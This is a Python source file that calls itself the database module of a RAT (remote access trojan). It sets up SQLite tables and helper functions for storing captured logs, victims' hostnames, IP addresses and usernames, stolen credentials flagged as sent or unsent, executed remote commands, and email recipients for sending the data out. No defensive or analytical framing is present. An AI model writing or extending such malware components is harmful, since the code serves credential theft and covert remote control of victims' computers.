"""
RAT Database Module
Handles SQLite database operations for configuration and log storage
"""

import sqlite3
import os
from datetime import datetime
from .config import Config

DATABASE_PATH = Config.DATABASE_PATH

def get_db_path():
    """Get full path to database file"""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    parent_dir = os.path.dirname(script_dir)
    return os.path.join(parent_dir, DATABASE_PATH)

def get_db_connection():
    """Get a database connection"""
    conn = sqlite3.connect(get_db_path())
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    """Initialize the database with required tables"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Recipients table - stores email recipients
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS recipients (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT UNIQUE NOT NULL,
            added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            active BOOLEAN DEFAULT 1
        )
    ''')
    
    # Logs table - stores captured logs
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            log_data TEXT NOT NULL,
            captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            sent BOOLEAN DEFAULT 0
        )
    ''')
    
    # System info table - stores system information
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS system_info (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            hostname TEXT,
            os_info TEXT,
            ip_address TEXT,
            username TEXT,
            captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Credentials table - stores captured credentials
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            source TEXT,
            username TEXT,
            password TEXT,
            captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            sent BOOLEAN DEFAULT 0
        )
    ''')
    
    # Commands table - stores executed remote commands
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            command TEXT NOT NULL,
            output TEXT,
            executed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Insert default recipients if table is empty
    cursor.execute('SELECT COUNT(*) FROM recipients')
    if cursor.fetchone()[0] == 0:
        for email in Config.DEFAULT_RECIPIENTS:
            try:
                cursor.execute('INSERT INTO recipients (email) VALUES (?)', (email,))
            except sqlite3.IntegrityError:
                pass
    
    conn.commit()
    conn.close()
    print(f"[+] Database initialized at {get_db_path()}")

def add_recipient(email):
    """Add a new email recipient"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    try:
        cursor.execute('INSERT INTO recipients (email) VALUES (?)', (email,))
        conn.commit()
        return True
    except sqlite3.IntegrityError:
        return False
    finally:
        conn.close()

def get_recipients(active_only=True):
    """Get all email recipients"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    if active_only:
        cursor.execute('SELECT email FROM recipients WHERE active = 1')
    else:
        cursor.execute('SELECT email FROM recipients')
    
    emails = [row['email'] for row in cursor.fetchall()]
    conn.close()
    return emails

def toggle_recipient(email, active):
    """Toggle recipient active status"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('UPDATE recipients SET active = ? WHERE email = ?', (active, email))
    conn.commit()
    conn.close()

def save_log(log_data):
    """Save captured log to database"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Truncate if too long
    if len(log_data) > Config.MAX_LOG_SIZE:
        log_data = log_data[:Config.MAX_LOG_SIZE]
    
    cursor.execute('INSERT INTO logs (log_data, sent) VALUES (?, 0)', (log_data,))
    conn.commit()
    conn.close()

def mark_logs_sent():
    """Mark all unsent logs as sent"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('UPDATE logs SET sent = 1 WHERE sent = 0')
    conn.commit()
    conn.close()

def get_logs(limit=50):
    """Get recent logs"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('''
        SELECT id, log_data, captured_at, sent 
        FROM logs 
        ORDER BY captured_at DESC 
        LIMIT ?
    ''', (limit,))
    logs = cursor.fetchall()
    conn.close()
    return logs

def save_system_info(hostname, os_info, ip_address, username):
    """Save system information"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO system_info (hostname, os_info, ip_address, username)
        VALUES (?, ?, ?, ?)
    ''', (hostname, os_info, ip_address, username))
    conn.commit()
    conn.close()

def get_system_info():
    """Get latest system information"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('''
        SELECT * FROM system_info 
        ORDER BY captured_at DESC 
        LIMIT 1
    ''')
    info = cursor.fetchone()
    conn.close()
    return dict(info) if info else None

def save_credential(source, username, password):
    """Save captured credential"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO credentials (source, username, password, sent)
        VALUES (?, ?, ?, 0)
    ''', (source, username, password))
    conn.commit()
    conn.close()

def get_credentials(sent_only=False):
    """Get credentials from database"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    if sent_only:
        cursor.execute('SELECT * FROM credentials WHERE sent = 0')
    else:
        cursor.execute('SELECT * FROM credentials ORDER BY captured_at DESC')
    
    creds = cursor.fetchall()
    conn.close()
    return [dict(c) for c in creds]

def mark_credentials_sent():
    """Mark all unsent credentials as sent"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('UPDATE credentials SET sent = 1 WHERE sent = 0')
    conn.commit()
    conn.close()

def save_command(command, output):
    """Save executed command and output"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('INSERT INTO commands (command, output) VALUES (?, ?)', 
                  (command, output))
    conn.commit()
    conn.close()

def get_commands(limit=50):
    """Get recent commands"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('''
        SELECT * FROM commands 
        ORDER BY executed_at DESC 
        LIMIT ?
    ''', (limit,))
    commands = cursor.fetchall()
    conn.close()
    return [dict(c) for c in commands]

def delete_old_logs(days=7):
    """Delete logs older than specified days"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cutoff = datetime.now().timestamp() - (days * 86400)
    cursor.execute('DELETE FROM logs WHERE captured_at < ?', (cutoff,))
    conn.commit()
    deleted = cursor.rowcount
    conn.close()
    return deleted
